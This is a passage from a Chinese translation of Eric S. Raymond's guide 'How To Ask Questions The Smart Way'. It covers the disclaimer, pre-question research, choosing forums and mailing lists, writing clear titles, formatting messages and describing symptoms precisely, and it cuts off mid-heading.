title="声明"></a>声明</h2><p>许多项目在他们的使用协助/说明网页中链接了本指南，这么做很好，我们也鼓励大家都这么做。但如果你是负责管理这个项目网页的人，请在超链接附近的显著位置上注明：</p><p><strong>本指南不提供此项目的实际支持服务！</strong></p><p>我们已经深刻领教到少了上述声明所带来的痛苦。因为少了这点声明，我们不停地被一些白痴纠缠。这些白痴认为既然我们发布了这本指南，那么我们就有责任解决世上所有的技术问题。</p><p>如果你是因为需要某些协助而正在阅读这本指南，并且最后离开是因为发现从本指南作者们身上得不到直接的协助，那么你就是我们所说的那些白痴之一。别问我们问题，我们只会忽略你。我们在这本指南中是教你如何从那些真正懂得你所遇到软件或硬件问题的人取得协助，而 99% 的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在<a href="http://www.catb.org/~esr/faqs/hacker-howto.html" target="_blank" rel="noopener">黑客</a>的世界里，当你拋出一个技术问题时，最终是否能得到有用的回答，往往取决于你所提问和追问的方式。本指南将教你如何正确的提问以获得你满意的答案。</p><p>不只是黑客，现在开源（Open Source）软件已经相当盛行，你常常也可以由其他有经验的使用者身上得到好答案，这是件<strong>好事</strong>；使用者比起黑客来，往往对那些新手常遇到的问题更宽容一些。然而，将有经验的使用者视为黑客，并采用本指南所提的方法与他们沟通，同样也是能从他们身上得到满意回答的最有效方式。</p><p>首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发他们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，”好问题！”是诚挚的大力称赞。</p><p>尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。</p><p>我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 —— 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 <code>失败者（撸瑟）</code> （由于历史原因，我们有时把它拼作 <code>lusers</code>）。</p><p>我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们了解这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们回答问题的风格是指向那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就是在降低做自己最擅长的事情上的效率。</p><p>我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情的滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效的利用时间来回答<code>赢家（winner）</code>的问题。</p><p>如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 —— 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。</p><p>所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 – 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。</p><p>如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 – 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。</p><p>（欢迎对本指南提出改进意见。你可以 email 你的建议至 <a href="esr@thyrsus.com">esr@thyrsus.com</a> 或 <a href="respond-auto@linuxmafia.com">respond-auto@linuxmafia.com</a>。然而请注意，本文并非<a href="http://www.ietf.org/rfc/rfc1855.txt" target="_blank" rel="noopener">网络礼节</a>的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议）。</p><h2 id="在提问之前"><a href="#在提问之前" class="headerlink" title="在提问之前"></a>在提问之前</h2><p>在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：</p><ol><li>尝试在你准备提问的论坛的旧文章中搜索答案。</li><li>尝试上网搜索以找到答案。</li><li>尝试阅读手册以找到答案。</li><li>尝试阅读常见问题文件（FAQ）以找到答案。</li><li>尝试自己检查或试验以找到答案。</li><li>向你身边的强者朋友打听以找到答案。</li><li>如果你是程序开发者，请尝试阅读源代码以找到答案。</li></ol><p>当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所<strong>学到</strong>的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。</p><p>运用某些策略，比如先用 Google 搜索你所遇到的各种错误信息（既搜索 <a href="http://groups.google.com/" target="_blank" rel="noopener">Google 论坛</a>，也搜索网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句 <code>我在 Google 中搜过下列句子但没有找到什么有用的东西</code> 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。</p><p>别着急，不要指望几秒钟的 Google 搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。</p><p>准备好你的问题，再将问题仔细的思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。</p><p>小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着<code>蠢问题…</code>， 一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。</p><p>绝不要自以为<strong>够格</strong>得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去<strong>挣到</strong>一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 —— 一个有潜力能贡献社区经验的问题，而不仅仅是被动的从他人处索取知识。</p><p>另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。<code>谁能给点提示？</code>、<code>我的这个例子里缺了什么？</code>以及<code>我应该检查什么地方</code>比<code>请把我需要的确切的过程贴出来</code>更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。</p><h2 id="当你提问时"><a href="#当你提问时" class="headerlink" title="当你提问时"></a>当你提问时</h2><h3 id="慎选提问的论坛"><a href="#慎选提问的论坛" class="headerlink" title="慎选提问的论坛"></a>慎选提问的论坛</h3><p>小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：</p><ul><li>在与主题不合的论坛上贴出你的问题。</li><li>在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然。</li><li>在太多的不同新闻群组上重复转贴同样的问题（cross-post）。</li><li>向既非熟人也没有义务解决你问题的人发送私人电邮。</li></ul><p>黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。</p><p>因此，第一步是找到对的论坛。再说一次，Google 和其它搜索引擎还是你的朋友，用它们来找到与你遭遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链接。如果你的努力（包括<strong>阅读</strong> FAQ）都没有结果，网站上也许还有报告 Bug（Bug-reporting）的流程或链接，如果是这样，链过去看看。</p><p>向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 – 如果你不确定，那就向别处发送，或者压根别发。</p><p>在选择论坛、新闻群组或邮件列表时，别太相信名字，先看看 FAQ 或者许可书以弄清楚你的问题是否切题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮助你归纳出更好的问题。</p><p>别像机关枪似的一次”扫射”所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。</p><p>搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix 或 Windows 操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之前什么也别问。</p><p>一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助到许多人的问题。</p><p>可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端 —— 已经好几次了，一些热门软件的作者从自己软件的支持中抽身出来，因为伴随而来涌入其私人邮箱的无用邮件变得无法忍受。</p><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h3><p>搜索，<strong>然后</strong> 在 Stack Exchange 问。</p><p>近年来，Stack Exchange community 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放源码的项目。</p><p>因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的机率某人已经问了一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。</p><p>Stack Exchange 已经成长到<a href="http://stackexchange.com/sites" target="_blank" rel="noopener">超过一百个网站</a>，以下是最常用的几个站：</p><ul><li>Super User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线之类的，请到这里。</li><li>Stack Overflow 是问写程序有关的问题。</li><li>Server Fault 是问服务器和网管相关的问题。</li></ul><h3 id="网站和-IRC-论坛"><a href="#网站和-IRC-论坛" class="headerlink" title="网站和 IRC 论坛"></a>网站和 IRC 论坛</h3><p>本地的使用者群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表）， 这些地方是开始提问的好首选，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。有广告赞助的 IRC 频道是公开欢迎提问的地方，通常可以即时得到回应。</p><p>事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复 “用<strong>我们的</strong>版本”。</p><p>在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。</p><p>通过论坛或 IRC 频道来提供使用者支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。</p><p>在使用 IRC 的时候，首先最好不要发布很长的问题描述，有些人称之为频道洪水。最好通过一句话的问题描述来开始聊天。</p><h3 id="第二步，使用项目邮件列表"><a href="#第二步，使用项目邮件列表" class="headerlink" title="第二步，使用项目邮件列表"></a>第二步，使用项目邮件列表</h3><p>当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用这种办法：</p><ul><li>任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题对整个项目群组来说太愚蠢，也不能成为骚扰个别开发者的理由。</li><li>向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。</li><li>大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。</li><li>如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。</li></ul><p>如果一个项目既有”使用者” 也有”开发者”（或”黑客”）邮件列表或论坛，而你又不会动到那些源代码，那么就向”使用者”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。</p><p>然而，如果你<strong>确信</strong>你的问题很特别，而且在”使用者” 列表或论坛中几天都没有回复，可以试试前往”开发者”列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任何私有或半私有列表的好主意）</p><p>如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。</p><h3 id="使用有意义且描述明确的标题"><a href="#使用有意义且描述明确的标题" class="headerlink" title="使用有意义且描述明确的标题"></a>使用有意义且描述明确的标题</h3><p>在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的<code>帮帮忙</code>、<code>跪求</code>、<code>急</code>（更别说<code>救命啊！！！！</code>这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而应该是在这点空间中使用极简单扼要的描述方式来提出问题。</p><p>一个好标题范例是<code>目标 —— 差异</code>式的描述，许多技术支持组织就是这样做的。在<code>目标</code>部分指出是哪一个或哪一组东西有问题，在<code>差异</code>部分则描述与期望的行为不一致的地方。</p><blockquote><p>蠢问题：救命啊！我的笔记本电脑不能正常显示了！</p></blockquote><blockquote><p>聪明问题：X.org 6.8.1 的鼠标光标会变形，某牌显卡 MV1005 芯片组。</p></blockquote><blockquote><p>更聪明问题：X.org 6.8.1 的鼠标光标，在某牌显卡 MV1005 芯片组环境下 - 会变形。</p></blockquote><p>编写<code>目标 —— 差异</code> 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标光标或者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境<strong>和</strong>你遇到的问题。</p><p>总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。</p><p>如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 <code>Re: 测试</code> 或者 <code>Re: 新 bug</code> 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。</p><p>对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程序，比如 mutt ，允许使用者按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发的消息。</p><p>仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定讨论串。所以宁可发一个全新的邮件。</p><p>在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们只会被正在查看该标题的人读到。所以，除非你<strong>只想</strong>在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。</p><h3 id="使问题容易回复"><a href="#使问题容易回复" class="headerlink" title="使问题容易回复"></a>使问题容易回复</h3><p>以<code>请将你的回复发送到……</code>来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，<a href="http://linuxmafia.com/faq/Mail/muas.html" target="_blank" rel="noopener">换个好点的</a>；如果是操作系统不支持这种邮件程序，也换个好点的。</p><p>在论坛，要求通过电子邮件回复是非常无礼的，除非你认为回复的信息可能比较敏感（有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如<code>追踪此讨论串</code>、<code>有回复时发送邮件提醒</code>等功能。</p><h3 id="用清晰、正确、精准并语法正确的语句"><a href="#用清晰、正确、精准并语法正确的语句" class="headerlink" title="用清晰、正确、精准并语法正确的语句"></a>用清晰、正确、精准并语法正确的语句</h3><p>我们从经验中发现，粗心的提问者通常也会粗心的写程序与思考（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。</p><p>正确的拼写、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 —— 事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它<strong>必须很</strong>准确，而且有迹象表明你是在思考和关注问题。</p><p>正确地拼写、使用标点和大小写，不要将<code>its</code>混淆为<code>it&#39;s</code>，<code>loose</code>搞成<code>lose</code>或者将<code>discrete</code>弄成<code>discreet</code>。不要<strong>全部用大写</strong>，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。<a href="http://en.wikipedia.org/wiki/Alan_Cox" target="_blank" rel="noopener">Alan Cox</a> 也许可以这样做，但你不行）。</p><p>更白话的说，如果你写得像是个半文盲[译注：<a href="http://zh.wikipedia.org/wiki/小白" target="_blank" rel="noopener">小白</a>]，那多半得不到理睬。也不要使用即时通信中的简写或<a href="http://zh.wikipedia.org/wiki/火星文" target="_blank" rel="noopener">火星文</a>，如将<code>的</code>简化为<code>d</code>会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。</p><p>如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚未被阅读就被直接删除的可能性降到最低。</p><p>如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的：<br>[译注：以下附上原文以供使用]</p><blockquote><p>English is not my native language; please excuse typing errors.</p></blockquote><ul><li>英文不是我的母语，请原谅我的错字或语法。</li></ul><blockquote><p>If you speak $LANGUAGE, please email/PM me;<br>I may need assistance translating my question.</p></blockquote><ul><li>如果你说<strong>某语言</strong>，请寄信/私讯给我；我需要有人协助我翻译我的问题。</li></ul><blockquote><p>I am familiar with the technical terms,<br>but some slang expressions and idioms are difficult for me.</p></blockquote><ul><li>我对技术名词很熟悉，但对于俗语或是特别用法比较不甚了解。</li></ul><blockquote><p>I’ve posted my question in $LANGUAGE and English.<br>I’ll be glad to translate responses, if you only use one or the other.</p></blockquote><ul><li>我把我的问题用<strong>某语言</strong>和英文写出来，如果你只用一种语言回答，我会乐意将其翻译成另一种。</li></ul><h3 id="使用易于读取且标准的文件格式发送问题"><a href="#使用易于读取且标准的文件格式发送问题" class="headerlink" title="使用易于读取且标准的文件格式发送问题"></a>使用易于读取且标准的文件格式发送问题</h3><p>如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：</p><ul><li>使用纯文字而不是 HTML (<a href="http://archive.birdhouse.org/etc/evilmail.html" target="_blank" rel="noopener">关闭 HTML</a> 并不难）。</li><li>使用 MIME 附件通常是可以的，前提是真正有内容（譬如附带的源代码或 patch），而不仅仅是邮件程序生成的模板（譬如只是信件内容的拷贝）。</li><li>不要发送一段文字只是一行句子但自动换行后会变成多行的邮件（这使得回复部分内容非常困难）。设想你的读者是在 80 个字符宽的终端机上阅读邮件，最好设置你的换行分割点小于 80 字。</li><li>但是，对一些特殊的文件<strong>不要</strong>设置固定宽度（譬如日志档案拷贝或会话记录）。数据应该原样包含，让回复者有信心他们看到的是和你看到的一样的东西。</li><li>在英语论坛中，不要使用<code>Quoted-Printable</code> MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持这种编码。当它们处理换行时，那些文本中四处散布的<code>=20</code>符号既难看也分散注意力，甚至有可能破坏内容的语意。</li><li>绝对，<strong>永远</strong>不要指望黑客们阅读使用封闭格式编写的文档，像微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你家门口时你的反应一样。即便他们能够处理，他们也很厌恶这么做。</li><li>如果你从使用 Windows 的电脑发送电子邮件，关闭微软愚蠢的<code>智能引号</code>功能 （从[选项] &gt; [校订] &gt; [自动校正选项]，勾选掉<code>智能引号</code>单选框），以免在你的邮件中到处散布垃圾字符。</li><li>在论坛，勿滥用<code>表情符号</code>和<code>HTML</code>功能（当它们提供时）。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是对答案感兴趣。</li></ul><p>如果你使用图形用户界面的邮件程序（如微软公司的 Outlook 或者其它类似的），注意它们的默认设置不一定满足这些要求。大多数这类程序有基于选单的<code>查看源代码</code>命令，用它来检查发送文件夹中的邮件，以确保发送的是纯文本文件同时没有一些奇怪的字符。</p><h3 id="精确地描述问题并言之有物"><a href="#精确地描述问题并言之有物" class="headerlink" title="精确地描述问题并言之有物"></a>精确地描述问题并言之有物</h3><ul><li>仔细、清楚地描述你的问题或 Bug 的症状。</li><li>描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：<code>Fedora Core 4</code>、<code>Slackware 9.1</code>等）。</li><li>描述在提问前你是怎样去研究和理解这个问题的。</li><li>描述在提问前为确定问题而采取的诊断步骤。</li><li>描述最近做过什么可能相关的硬件或软件变更。</li><li>尽可能的提供一个可以<code>重现这个问题的可控环境</code>的方法。</li></ul><p>尽量去揣测一个黑客会怎样反问你，在你提问之前预先将黑客们可能遇到的问题回答一遍。</p><p>以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。</p><p><a href="http://www.chiark.greenend.org.uk/~sgtatham/" target="_blank" rel="noopener">Simon Tatham</a> 写过一篇名为《<a href="http://www.chiark.greenend.org.uk/~sgtatham/bugs-cn.html" target="_blank" rel="noopener">如何有效的报告 Bug</a>》的出色文章。强力推荐你也读一读。</p><h3 id="话不在多而在精"><a href="#话不在多而在精" class="headerlink" title="话不在多而在精"></a>话不在多而在精</h3><p>你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。</p><p>这样做的用处至少有三点。<br>第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加；<br>第二，简化问题使你更有可能得到<strong>有用</strong>的答案；<br>第三，在精炼你的 bug 报告的过程中，你很可能就自己找到了解决方法或权宜之计。</p><h3 id="别动辄声称找到-Bug"><a href="#别动辄声称找到-Bug" class="headerlink" title="别动辄声称找到 Bug"></a>别动辄声称找到 Bug</h3><p>当你在使用软件中遇到问题，除非你非常、<strong>非常</strong>的有根据，不要动辄声称找到了 Bug。提示：除非你能提供解决问题的源代码补丁，或者提供回归测试来表明前一版本中行为不正确，否则你都多半不够完全确信。这同样适用在网页和文件，如果你（声称）发现了文件的<code>Bug</code>，你应该能提供相应位置的修正或替代文件。</p><p>请记得，还有许多其它使用者没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前<a href="#在提问之前">已经做了这些，是吧</a>？）。这也意味着很有可能是你弄错了而不是软件本身有问题。</p><p>编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了 Bug，也就是在质疑他们的能力，即使你是对的，也有可能会冒犯到其中某部分人。当你在标题中嚷嚷着有<code>Bug</code>时，这尤其严重。</p><p>提问时，即使你私下非常确信已经发现一个真正的 Bug，最好写得像是<strong>你</strong>做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有 Bug，维护者就会向你道歉，这总比你惹恼别人然后欠别人一个道歉要好一点。</p><h3 id="低声下气不能代替你的功课"><a href="#低声下气不能代替你的功课" class="headerlink" title="低声下气不能代替你的功课"></a>低声下气不能代替你的功课</h3><p>有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 —— 低声下气：<code>我知道我只是个可悲的新手，一个撸瑟，但...</code>。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。</p><p>别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。</p><p>有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。</p><h3 id="描述问题症状而非你的猜测"><a href="#描述问题症状而非你的猜测" class="headerlink" title="描述问题症状而非你的猜测"></a>描述问题症状而非你的猜测</h3><p>告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。</p><p><strong>蠢问题</strong></p><blockquote><p>我在编译内核时接连遇到 SIG11 错误，<br>我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？</p></blockquote><p><strong>聪明问题</strong></p><blockquote><p>我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组），<br>256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误，<br>但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。<br>所有内存都换过了，没有效果。相关部分的标准编译记录如下…。</p></blockquote><p>由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：<code>所有的诊断专家都来自密苏里州。</code> 美国国务院的官方座右铭则是：<code>让我看看</code>（出自国会议员 Willard D. Vandiver 在 1899 年时的讲话：<code>我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。</code>） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方的展示给我们看吧！</p><h3 id="按发生时间先后列出问题症状"><a href="#按发生时间先后列出问题症状" class="headerlink" title="按发生时间先后列出问题症状"></a>按发生时间先后列出问题症状</h3><p>问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。</p><p>如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住，<code>多</code>不等于<code>好</code>。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。</p><p>如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样黑客们在读你的记录时就知道该注意哪些内容了。</p><h3 id="描述目标而不是过程"><a href="#描述目标而不是过程" class="headerlink" title="描述目标而不是过程"></a>描述目标而不是过程</h3><p>如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。</p><p>经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。</p><p><strong>蠢问题</strong></p><blockquote><p>我怎样才能从某绘图程序的颜色选择器中取得十六进制的的 RGB 值？</p></blockquote><p><strong>聪明问题</strong></p><blockquote><p>我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot），<br>但却无法从某绘图程序的颜色选择器取得十六进制的的 RGB 值。</p></blockquote><p>第二种提问法比较聪明，你可能得到像是<code>建议采用另一个更合适的工具</code>的回复。</p><h3 id="别要求使用私人电邮回复"><a href="#别要求使用私人电邮回复" class="headerlink" title="别要求使用私人电邮回复"></a>别要求使用私人电邮回复</h3><p>黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。</p><p>当你要求私下回复时，这个过程和奖励都被中止。别这样做，让<strong>回复者</strong>来决定是否私下回答 —— 如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人没有兴趣。</p><p>这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句会是<code>向我发电邮，我将为论坛归纳这些回复</code>。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来是非常有礼貌的 —— 但你必须信守诺言。</p><h3 id="清楚明确的表达你的问题以及需求"><a 